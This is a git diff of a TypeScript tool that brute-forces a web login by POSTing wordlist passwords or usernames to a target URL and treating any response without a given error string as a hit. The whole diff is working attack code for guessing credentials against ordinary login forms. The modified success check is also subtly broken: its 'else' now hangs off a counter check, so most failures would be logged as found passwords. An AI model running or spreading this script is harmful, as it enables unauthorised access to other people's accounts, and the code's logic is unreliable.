@@ -21,7 +21,7 @@ const yarg= yargs(hideBin(process.argv))
 
 //variable declarations
 
-let body= JSON.parse(yarg.body)
+
 let urloriginal= yarg.url
 
 
@@ -52,11 +52,9 @@ let error= yarg.error
 let content= yarg.content
 let velocidad= yarg.v
 
-let usernamebody= Object.keys(body)[0]
-let passwordbody= Object.keys(body)[1]
 
-let passw=""
-let user=""
+
+
 
 let found=false
 
@@ -68,16 +66,26 @@ let workers=0
 
 
 async function worker(){ console.log("worker iniciado")
-   setInterval(() => {
+
+    let body= JSON.parse(yarg.body)
+    let usernamebody= Object.keys(body)[0]
+    let passwordbody= Object.keys(body)[1]
+
+    while(found===false){
+        
+
               if(yarg.password===true){
-                  let passw:any= wordlist.shift()
+                let passw:any= wordlist.shift()
         try{
             
             body[passwordbody]=passw; 
-            axios.post(trueurl,body,{headers:{"Content-Type":content},httpsAgent:agent, transformResponse: [(data) => data]}).then(function(data){return data.data}).then(function(data){
-                if(data.includes(error)){++contador; console.log("contraseña incorrecta:",passw,"contador:",contador)}
+         let peticion:any= await  axios.post(trueurl,body,{headers:{"Content-Type":content},httpsAgent:agent, transformResponse: [(data) => data]})
+         let data:String=peticion.data
+
+                if(data.includes(error)){++contador}
+                if(contador%100===0){console.log(contador)}
                 else{console.log("contraseña encontrada:",passw,"html:",data),found=true}
-            }).catch(function(error){console.log("error:",error)})
+            
 
         }catch(error){console.log("error",error); wordlist.unshift(passw)}
         
@@ -87,20 +95,20 @@ async function worker(){ console.log("worker iniciado")
          try{
               
             body[usernamebody]=user;
-             axios.post(trueurl,body,{headers:{"Content-Type":content},httpsAgent:agent, transformResponse: [(data) => data]}).then(function(data){return data.data}).then(function(data){
+           let peticion:any= await axios.post(trueurl,body,{headers:{"Content-Type":content},httpsAgent:agent, transformResponse: [(data) => data]})
+           let data:String= peticion.data
                 if(data.includes(error)){++contador; console.log("usuario incorrecto:",user,"contador:",contador)}
                 else{console.log("usuario encontrado:",user),found=true}
-            })
-           
-        }catch(error){console.log("error:",error); wordlist.unshift(user)}
+            } 
+             catch(error){console.log("error:",error); wordlist.unshift(user)}
     }
 
-   }, 1); 
+    
    
 
 
    
-}
+}}
 
 //code
 
